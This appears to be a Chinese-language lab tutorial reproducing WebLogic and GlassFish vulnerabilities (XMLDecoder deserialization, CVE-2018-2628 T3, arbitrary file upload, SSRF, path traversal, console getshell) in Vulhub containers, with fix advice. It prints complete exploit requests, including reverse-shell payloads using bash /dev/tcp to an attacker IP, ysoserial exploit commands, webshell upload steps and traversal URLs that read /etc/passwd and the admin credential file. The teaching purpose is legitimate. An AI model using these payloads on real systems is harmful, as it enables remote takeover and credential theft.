继续上篇复现常见中间件漏洞

在虚拟机中安装docker环境具体就不演示了[Vulhub - Docker-Compose file for vulnerability
environment](https://vulhub.org/#/docs/install-docker-one-click/)

## Weblogic

WebLogic是美国Oracle公司出品的一个applicationserver，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java
Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。

### XMLDecoder 反序列化漏洞（CVE-2017-3506 & CVE-2017-10271）

影响版本：Weblogic < 10.3.6

漏洞成因：Weblogic的WLS
Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。

使用docker搭建环境

浏览器访问：http://127.0.0.1:7001/, 界面上出现Error 404--Not Found，即启动成功。

![1646198478_621efecebc372b11f45ad.png!small?1646198478379](https://image.3001.net/images/20220302/1646198478_621efecebc372b11f45ad.png!small?1646198478379)

访问 /wls-wsat/CoordinatorPortType 返回如下页面，则可能存在此漏洞

![1646198921_621f0089ec8da414c2db5.png!small?1646198921448](https://image.3001.net/images/20220302/1646198921_621f0089ec8da414c2db5.png!small?1646198921448)

漏洞不仅存在于 /wls-wsat/CoordinatorPortType 。  
只要是在wls-wsat包中的Uri皆受到影响，可以查看web.xml得知所有受到影响的Uri，路径为：\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\\_WL_internal\wls-wsat\54p17w\war\WEB-INF\web.xml  
默认受到影响的Uri如下：

    
    
    /wls-wsat/CoordinatorPortType
    /wls-wsat/RegistrationPortTypeRPC
    /wls-wsat/ParticipantPortType
    /wls-wsat/RegistrationRequesterPortType
    /wls-wsat/CoordinatorPortType11
    /wls-wsat/RegistrationPortTypeRPC11
    /wls-wsat/ParticipantPortType11
    /wls-wsat/RegistrationRequesterPortType11
    

抓包POST写入数据，其中Content-Type需要等于text/xml,否则可能导致XMLDecoder不解析。

这句话会写入一个test.jsp访问会打印，以此验证写shell

    
    
    POST /wls-wsat/CoordinatorPortType HTTP/1.1
    Host: 127.0.0.1:7001
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: text/xml
    Content-Length: 533
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java>
    <void class="java.io.PrintWriter">
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
    <void method="println">
    <string>
    <![CDATA[
    <% out.print("1_Ry"); %>
    ]]>
    </string>
    </void>
    <void method="close"/>
    </void>
    </java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
    </soapenv:Envelope>
    

访问 /bea_wls_internal/test.jsp,如下，可以看到写入成功

![1646210419_621f2d730695e52c88815.png!small?1646210418528](https://image.3001.net/images/20220302/1646210419_621f2d730695e52c88815.png!small?1646210418528)

验证漏洞成功，接下来尝试命令执行反弹shell到本地，这里注意反弹ip不能是127.0.0.1，这样反弹不到

    
    
    POST /wls-wsat/CoordinatorPortType HTTP/1.1
    Host: 127.0.0.1:7001
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: text/xml
    Content-Length: 638
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java version="1.4.0" class="java.beans.XMLDecoder">
    <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
    <void index="0">
    <string>/bin/bash</string>
    </void>
    <void index="1">
    <string>-c</string>
    </void>
    <void index="2">
    <string>bash -i &ampgt&ampamp /dev/tcp/192.168.0.108/9999 0&ampgt&ampamp1</string>
    </void>
    </array>
    <void method="start"/></void>
    </java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
    </soapenv:Envelope>
    

![1646221180_621f577caef885324e0b4.png!small?1646221180424](https://image.3001.net/images/20220302/1646221180_621f577caef885324e0b4.png!small?1646221180424)

当然也可以写入jsp webshell，这里就不演示了

CVE-2017-3506的补丁加了验证函数，补丁在weblogic/wsee/workarea/WorkContextXmlInputAdapter.java中添加了validate方法,
验证Payload中的节点是否存在object Tag。

我们将object换成void就可绕过此补丁，产生了CVE-2017-10271，还可以换成array,new等绕过。

    
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java>
    <void class="java.io.PrintWriter">
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
    <void method="println">
    <string>
    <![CDATA[
    <% out.print("1_Ry"); %>
    ]]>
    </string>
    </void>
    <void method="close"/>
    </void>
    </java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
    </soapenv:Envelope>
    

修复建议：

  * 安装补丁。

  * 或删除wls-wsat组件，再次访问返回404.

    
    
    1.删除C:\Oracle\Middleware\wlserver_10.3\server\lib\wls-wsat.war
    2.删除C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\.internal\wls-wsat.war
    3.删除C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat
    

### Weblogic wls9_async_response,wls-wsat 反序列化远程代码执行漏洞（CVE-2019-2725）

影响组件：bea_wls9_async_response.war, wls-wsat.war

影响版本：10.3.6.0, 12.1.3.0

访问 /_async/AsyncResponseService 返回如下页面，则可能存在此漏洞。

![1646226679_621f6cf74adac06b012f9.png!small?1646226679476](https://image.3001.net/images/20220302/1646226679_621f6cf74adac06b012f9.png!small?1646226679476)

漏洞不仅存在于 /_async/AsyncResponseService
只要是在bea_wls9_async_response包中的Uri皆受到影响，可以查看web.xml得知所有受到影响的Uri，路径为：Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\\_WL_internal\bea_wls9_async_response\8tpkys\war\WEB-INF\web.xml  
默认受到影响的Uri如下：

    
    
    /_async/AsyncResponseService
    /_async/AsyncResponseServiceJms
    /_async/AsyncResponseServiceHttps
    

此漏洞实际上是CVE-2017-10271的又一入口.

其中CVE-2017-3506的补丁是过滤了object，CVE-2017-10271的补丁是过滤了new，method标签，且void后面只能跟index，array后面可以跟class，但是必须要是byte类型的。

绕过CVE-2017-10271补丁是因为class标签未被过滤所导致的

payload：

    
    
    POST /_async/AsyncResponseService HTTP/1.1
    Host: 127.0.0.1:7001
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: text/xml
    Content-Length: 786
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"
    xmlns:asy="http://www.bea.com/async/AsyncResponseService">
    <soapenv:Header>
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
    <void index="0">
    <string>/bin/bash</string>
    </void>
    <void index="1">
    <string>-c</string>
    </void>
    <void index="2">
    <string>bash -i &ampgt&ampamp /dev/tcp/192.168.0.108/9999 0&ampgt&ampamp1</string>
    </void>
    </array>
    <void method="start"/></void>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body>
    <asy:onAsyncDelivery/>
    </soapenv:Body></soapenv:Envelope>
    

![](https://image.3001.net/images/20220303/1646287335_622059e73408638ce4c9f.png!small)

### Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）

Weblogic Server WLS Core
Components反序列化命令执行漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。

下载ysoserial.jar [ysoserial-0.0.6-SNAPSHOT-BETA-all.jar](https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar)

使用ysoserial.jar，启动JRMP Server ，我创建了一个1_Ry文件夹，JRMP Server监听的端口为9999

    
    
    java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections1 'touch /tmp/1_Ry'
    

然后，使用[exploit.py](https://www.exploit-db.com/exploits/44553)脚本，向目标Weblogic（`http://your-ip:7001`）发送数据包：

    
    
    python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]
    

其中，`[victim ip]`和`[victim port]`是目标weblogic的IP和端口，`[path to
ysoserial]`是本地ysoserial的路径，`[JRMPListener ip]`和`[JRMPListener port]`第一步中启动JRMP
Server的IP地址和端口。`[JRMPClient]`是执行JRMPClient的类，可选的值是`JRMPClient`或`JRMPClient2`。

以下是我的构造的payload

    
    
    python exploit.py 127.0.0.1 7001 /root/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.0.108 9999 JRMPClient2
    

![1646313799_6220c147148612b082fd8.png!small?1646313799048](https://image.3001.net/images/20220303/1646313799_6220c147148612b082fd8.png!small?1646313799048)

可以看到命令执行成功，创建了个1_Ry文件夹

修复建议：

  * 过滤t3协议。

  * 安装补丁

### Weblogic 任意文件上传漏洞（CVE-2018-2894）

影响版本：12.1.3.0, 12.2.1.2, 12.2.1.3

漏洞成因：Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page
在"生产模式"下默认不开启，所以该漏洞有一定限制。

若需在Weblogic生产模式下进行复现，则需要登录后台页面，点击base_domain的配置，在"高级"设置中 开启 "启用 Web服务测试页" 选项

访问`http://your-ip:7001/console`，即可看到后台登录页面。

执行`docker-compose logs | grep password`可查看管理员密码，管理员用户名为`weblogic`。

![1646315445_6220c7b5ddac227e5b4f8.png!small?1646315445242](https://image.3001.net/images/20220303/1646315445_6220c7b5ddac227e5b4f8.png!small?1646315445242)

登录后台页面，点击`base_domain`的配置，在“高级”中开启“启用 Web 服务测试页”选项：（记得点保存）

![1646315749_6220c8e532dd413496ec8.png!small?1646315748535](https://image.3001.net/images/20220303/1646315749_6220c8e532dd413496ec8.png!small?1646315748535)

第一次上传点：访问
[http://127.0.0.1:7001/ws_utc/config.do](http://127.0.0.1:7001/ws_utc/config.do%EF%BC%8C)

设置Work Home
Dir为ws_utc应用的静态文件css目录`/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css`。因为访问这个目录是无需权限的

提交后，点击左侧 安全-> 添加，然后上传Webshell。

![1646316063_6220ca1f5341451a526a3.png!small?1646316062710](https://image.3001.net/images/20220303/1646316063_6220ca1f5341451a526a3.png!small?1646316062710)

点击提交submit，抓取上传的返回包，可以看到有一串数字，是时间戳

![1646316406_6220cb76e846aaa4cf307.png!small?1646316406432](https://image.3001.net/images/20220303/1646316406_6220cb76e846aaa4cf307.png!small?1646316406432)

然后访问
[http://127.0.0.1:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]](http://127.0.0.1:7001/ws_utc/css/config/keystore/%5B%E6%97%B6%E9%97%B4%E6%88%B3%5D_%5B%E6%96%87%E4%BB%B6%E5%90%8D%5D%EF%BC%8C%E5%8D%B3%E5%8F%AF%E6%89%A7%E8%A1%8Cwebshell)，即可执行webshell

![1646316554_6220cc0aa12322ef9cb3c.png!small?1646316554017](https://image.3001.net/images/20220303/1646316554_6220cc0aa12322ef9cb3c.png!small?1646316554017)

  
第二处上传点：http://127.0.0.1:7001/ws_utc/begin.do

点击右上角的文件夹，上传Webshell，点击提交，并抓取返回包

![1646317011_6220cdd300d692295b2b0.png!small?1646317010395](https://image.3001.net/images/20220303/1646317011_6220cdd300d692295b2b0.png!small?1646317010395)

可以看到返回的路径，直接访问http://127.0.0.1:7001/ws_utc/css/upload/RS_Upload_2022-03-03_14-18-52_934/import_file_name_shell.jsp

![1646317193_6220ce899a01fdfce9538.png!small?1646317193018](https://image.3001.net/images/20220303/1646317193_6220ce899a01fdfce9538.png!small?1646317193018)![1646317371_6220cf3bddfc51ff3329c.png!small?1646317371292](https://image.3001.net/images/20220303/1646317371_6220cf3bddfc51ff3329c.png!small?1646317371292)

### Weblogic SSRF漏洞 （CVE-2014-4210）

影响版本：10.0.2.0, 10.3.6.0

通过返回数据包中的错误信息，即可探测内网状态。

访问 /uddiexplorer/SearchPublicRegistries.jsp，若能正常访问，则可能存在此漏洞，填写任意信息，如下

![1646318270_6220d2be9df2368a39f06.png!small?1646318270088](https://image.3001.net/images/20220303/1646318270_6220d2be9df2368a39f06.png!small?1646318270088)

点击Search，并抓包，抓包之后在Burp中右键，选择Change request method, 将POST请求改变成GET。

![1646319144_6220d628b3de6a270224f.png!small?1646319144231](https://image.3001.net/images/20220303/1646319144_6220d628b3de6a270224f.png!small?1646319144231)

参数operator为SSRF的可控参数

  * 将其更改为开放的端口，如http://127.0.0.1:7001/，将返回error code![1646319388_6220d71c14d60413eb4a9.png!small?1646319387522](https://image.3001.net/images/20220303/1646319388_6220d71c14d60413eb4a9.png!small?1646319387522)

  * 若开放端口为HTTP协议（但我测了一下22端口也是显示这个），如http://127.0.0.1:80/则会返回did not have a valid SOAP content-type。![1646320299_6220daabd2d1aea9f1ec1.png!small?1646320299286](https://image.3001.net/images/20220303/1646320299_6220daabd2d1aea9f1ec1.png!small?1646320299286)

  * 访问不存在的端口，将返回could not connect over HTTP to server![1646319566_6220d7cec17e502b2c2c1.png!small?1646319566208](https://image.3001.net/images/20220303/1646319566_6220d7cec17e502b2c2c1.png!small?1646319566208)

通过返回数据包中的错误信息，即可探测内网状态。实战中可以通过爆破，从返回数据包的长度来判断开放了哪些端口，再根据开放的端口深入利用，这里可以参考一下[vulhub/weblogic/ssrf
at master · vulhub/vulhub
(github.com)](https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf)

修复建议：

  * 删除SearchPublicRegistries.jsp文件或修改SearchPublicRegistries.jsp文件后缀为不解析后缀，如SearchPublicRegistries.jspxxx，SearchPublicRegistries.jsp路径为：/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/uddiexplorer/5f6ebw\war

### Weblogic 弱口令 && 后台getshell

访问http://127.0.0.1:7001/console
自动重定向到http://127.0.0.1:7001/console/login/LoginForm.jsp，使用弱口令登陆后台。

进入后台后，点击部署，进一步点击右边的安装。

![1646376474_6221b61a4fe92ed92a2cd.png!small?1646376473566](https://image.3001.net/images/20220304/1646376474_6221b61a4fe92ed92a2cd.png!small?1646376473566)

选择上传文件

![1646377485_6221ba0d8d75a3d8ee7cc.png!small?1646377486024](https://image.3001.net/images/20220304/1646377485_6221ba0d8d75a3d8ee7cc.png!small?1646377486024)

上传war包

![1646377630_6221ba9eb499e7bab8d90.png!small?1646377630224](https://image.3001.net/images/20220304/1646377630_6221ba9eb499e7bab8d90.png!small?1646377630224)

上传完成以后选中你上传的文件,点击下一步

![1646377665_6221bac101f3eb6845d4c.png!small?1646377664400](https://image.3001.net/images/20220304/1646377665_6221bac101f3eb6845d4c.png!small?1646377664400)

再下一步后直接点击完成即可

![1646378078_6221bc5edf29e2eea4ccc.png!small?1646378078135](https://image.3001.net/images/20220304/1646378078_6221bc5edf29e2eea4ccc.png!small?1646378078135)

可以看到已经部署

![1646378177_6221bcc190aa44068409b.png!small?1646378177542](https://image.3001.net/images/20220304/1646378177_6221bcc190aa44068409b.png!small?1646378177542)

访问：http://ip:port/[war包名]/[包名内文件名]即可

![1646378250_6221bd0a734679d80c464.png!small?1646378249645](https://image.3001.net/images/20220304/1646378250_6221bd0a734679d80c464.png!small?1646378249645)

修复建议：

  * 避免后台弱口令

## GlassFish

GlassFish 是用于构建 Java EE 5应用服务器的开源开发项目的名称。它基于 Sun Microsystems 提供的 Sun Java
System Application Server PE 9 的源代码以及 Oracle 贡献的 TopLink
持久性代码。该项目提供了开发高质量应用服务器的结构化过程，以前所未有的速度提供新的功能。

默认端口：8080（Web应用端口，即网站内容），4848（GlassFish管理中心）

### GlassFish 任意文件读取漏洞（CVE-2017-1000028）

受影响版本：<=4.1.2版本

Java语言中会把%c0%af解析为\uC0AF，最后转义为ASCCII字符的/（斜杠）。利用..%c0%af..%c0%af来向上跳转，达到目录穿越、任意文件读取的效果。

计算机指定了UTF8编码接收二进制并进行转义，当发现字节以0开头，表示这是一个标准ASCII字符，直接转义，当发现110开头，则取2个字节 去掉110模  
板后转义。 UTF8编码模板如下

![1646394273_6221fba1822eddf637172.png!small?1646394272840](https://image.3001.net/images/20220304/1646394273_6221fba1822eddf637172.png!small?1646394272840)

C0AF 转换位二进制为 110 00000 10 101111 ，110开头去掉摸板后为00000 101111 转换为10进制为47，ASSCI为/。

    
    
    https://your-ip:4848/theme/META-INF%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
    

![1646396069_622202a584a9e5784b213.png!small?1646396068580](https://image.3001.net/images/20220304/1646396069_622202a584a9e5784b213.png!small?1646396068580)

读admin-keyfile文件，该文件是储存admin账号密码的文件

    
    
    https://127.0.0.1:4848/theme/META-INF/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afdomains/domain1/config/admin-keyfile
    

![1646396322_622203a27e6ea69529895.png!small?1646396321505](https://image.3001.net/images/20220304/1646396322_622203a27e6ea69529895.png!small?1646396321505)

修复建议

  * 升级GlassFish最新版本。

### GlassFish 后台Getshell

127.0.0.1:4848进入后台后 Applications，右边的deploy

![1646396520_622204682e01210651154.png!small?1646396519203](https://image.3001.net/images/20220304/1646396520_622204682e01210651154.png!small?1646396519203)

选中war包后上传，填写Context Root 这个关系到你访问的url，点击Ok。

![1646396585_622204a995e46f480f45d.png!small?1646396584656](https://image.3001.net/images/20220304/1646396585_622204a995e46f480f45d.png!small?1646396584656)

![1646378250_6221bd0a734679d80c464.png!small?1646378249645](https://image.3001.net/images/20220304/1646378250_6221bd0a734679d80c464.png!small?1646378249645)

修复建议

  * 不开放后台给外网

  * 避免使用弱口令

